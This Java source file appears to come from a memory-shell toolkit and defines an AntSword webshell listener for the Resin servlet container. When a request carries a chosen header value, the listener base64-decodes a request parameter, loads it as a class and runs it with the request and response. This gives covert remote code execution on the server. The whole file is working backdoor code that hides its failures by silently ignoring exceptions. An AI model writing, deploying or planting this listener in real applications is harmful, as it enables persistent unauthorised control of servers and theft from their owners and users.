package com.reajason.javaweb.memshell.resin.antsword;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class AntSwordListener extends ClassLoader implements ServletRequestListener {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordListener() {
    }

    public AntSwordListener(ClassLoader z) {
        super(z);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("deprecation")
    public Class<?> g(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    @Override
    @SuppressWarnings("all")
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = getResponseFromRequest(request);
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = (new AntSwordListener(this.getClass().getClassLoader())).g(bytes).newInstance();
                instance.equals(new Object[]{request, response});
            }
        } catch (Exception ignored) {
        }
    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
        HttpServletResponse response = null;
        response = (HttpServletResponse) getFieldValue(request, "_response");
        return response;
    }
}
